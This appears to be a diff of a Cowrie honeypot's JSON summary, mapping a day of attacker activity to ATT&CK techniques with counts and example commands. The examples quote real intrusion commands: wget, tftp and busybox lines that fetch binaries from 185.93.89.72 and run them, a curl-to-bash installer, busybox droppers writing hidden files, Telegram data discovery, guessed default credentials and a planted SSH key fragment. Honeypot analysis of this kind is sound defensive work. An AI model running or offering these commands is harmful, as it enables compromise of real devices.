@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-12 22:04:12",
+  "generated": "2026-09-12 23:03:21",
   "totals": {
-    "commands": 515,
-    "login_failed": 3493,
-    "login_success": 140,
-    "sessions": 3884
+    "commands": 567,
+    "login_failed": 3513,
+    "login_success": 144,
+    "sessions": 3939
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 3493,
+      "count": 3513,
       "examples": [
         "admin / 150580",
         "admin / 150488",
@@ -21,14 +21,14 @@
         "root / casa"
       ],
       "first": "2026-09-12T00:01:39.148725Z",
-      "last": "2026-09-12T22:00:48.849625Z",
-      "unique_ips": 156
+      "last": "2026-09-12T23:00:07.148684Z",
+      "unique_ips": 158
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 140,
+      "count": 144,
       "examples": [
         "root / root",
         "root / xmhdipc",
@@ -37,8 +37,8 @@
         "root / 123@@@"
       ],
       "first": "2026-09-12T00:08:14.272082Z",
-      "last": "2026-09-12T21:43:40.878227Z",
-      "unique_ips": 83
+      "last": "2026-09-12T23:00:45.458931Z",
+      "unique_ips": 86
     },
     {
       "id": "T1222.002",
@@ -60,7 +60,7 @@
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 40,
+      "count": 52,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
@@ -69,8 +69,8 @@
         "bash <(curl -sL https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.sh) -e https://sex"
       ],
       "first": "2026-09-12T00:08:18.733876Z",
-      "last": "2026-09-12T21:23:41.956296Z",
-      "unique_ips": 12
+      "last": "2026-09-12T22:20:20.271022Z",
+      "unique_ips": 13
     },
     {
       "id": "T1082",
@@ -92,15 +92,28 @@
       "id": "T1083",
       "name": "File and Directory Discovery",
       "tactic": "Discovery",
-      "count": 13,
+      "count": 23,
       "examples": [
         "#!/bin/sh\n\nfor proc_dir in /proc/*; do\n    pid=${proc_dir##*/}\n\n    result=$(ls -l \"/proc/$pid/exe\" 2> /dev/null)\n\n    i",
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
         "ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /va"
       ],
       "first": "2026-09-12T00:54:21.385464Z",
-      "last": "2026-09-12T20:17:10.238423Z",
-      "unique_ips": 4
+      "last": "2026-09-12T22:20:19.161802Z",
+      "unique_ips": 5
+    },
+    {
+      "id": "T1489",
+      "name": "Service Stop",
+      "tactic": "Impact",
+      "count": 21,
+      "examples": [
+        "#!/bin/sh\n\nfor proc_dir in /proc/*; do\n    pid=${proc_dir##*/}\n\n    result=$(ls -l \"/proc/$pid/exe\" 2> /dev/null)\n\n    i",
+        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
+      ],
+      "first": "2026-09-12T00:54:21.385464Z",
+      "last": "2026-09-12T22:20:19.161802Z",
+      "unique_ips": 3
     },
     {
       "id": "T1033",
@@ -115,19 +128,6 @@
       "first": "2026-09-12T00:08:18.733876Z",
       "last": "2026-09-12T21:23:40.859261Z",
       "unique_ips": 12
-    },
-    {
-      "id": "T1489",
-      "name": "Service Stop",
-      "tactic": "Impact",
-      "count": 11,
-      "examples": [
-        "#!/bin/sh\n\nfor proc_dir in /proc/*; do\n    pid=${proc_dir##*/}\n\n    result=$(ls -l \"/proc/$pid/exe\" 2> /dev/null)\n\n    i",
-        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
-      ],
-      "first": "2026-09-12T00:54:21.385464Z",
-      "last": "2026-09-12T12:38:28.903261Z",
-      "unique_ips": 2
     },
     {
       "id": "T1059.004",
@@ -219,43 +219,43 @@
   "unmapped": [
     [
       "shell",
-      67
+      69
     ],
     [
       "sh",
-      67
+      69
     ],
     [
       "system",
-      47
+      49
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
       40
     ],
     [
+      "sh .k",
+      20
+    ],
+    [
       "/bin/busybox LZRD",
       17
     ],
     [
-      "enable",
-      12
-    ],
-    [
       "/bin/busybox",
-      11
+      14
     ],
     [
-      "sh .k",
-      10
+      "enable",
+      13
     ],
     [
       "linuxshell",
-      8
+      9
     ],
     [
       "ping ;sh",
-      7
+      8
     ],
     [
       "cd /proc && cat self/cmdline",
@@ -267,34 +267,34 @@
     ],
     [
       "/bin/busybox UNSTABLE",
-      5
+      6
     ],
     [
-      "command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3",
+      "/bin/busybox hostname PBOC",
       2
     ],
     [
-      "python3 /tmp/bendi.py",
+      "/bin/busybox echo > /tmp/.b && sh /tmp/.b && cd /tmp/",
       2
     ],
     [
-      "rm /tmp/bendi.py",
+      "/bin/busybox echo > /var/.b && sh /var/.b && cd /var/",
       2
     ],
     [
-      "echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"",
+      "/bin/busybox echo > /var/run/.b && sh /var/run/.b && cd /var/run/",
       2
     ],
     [
-      "bash",
+      "/bin/busybox echo > /var/tmp/.b && sh /var/tmp/.b && cd /var/tmp/",
       2
     ],
     [
-      "cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----",
+      "/bin/busybox echo > /dev/.b && sh /dev/.b && cd /dev/",
       2
     ],
     [
-      "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW",
+      "/bin/busybox echo > /dev/shm/.b && sh /dev/shm/.b && cd /dev/shm/",
       2
     ]
   ]
